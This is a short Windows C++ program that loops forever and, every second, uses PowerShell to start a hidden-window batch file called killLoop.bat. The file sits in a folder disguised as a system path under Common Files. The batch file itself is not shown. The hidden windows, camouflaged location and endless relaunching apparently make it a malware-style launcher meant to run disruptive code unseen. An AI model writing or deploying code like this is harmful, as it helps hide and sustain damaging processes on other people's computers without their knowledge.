#include <Windows.h>
#include <conio.h>

int main() {
	while (true) {
		Sleep(1000);
		system("PowerShell -Command \"Start-Process -WindowStyle Hidden \\\"C:\\Program Files (x86)\\Common Files\\System\\logs\\battery\\killLoop.bat\\\"\"");
	}

	return 0;
}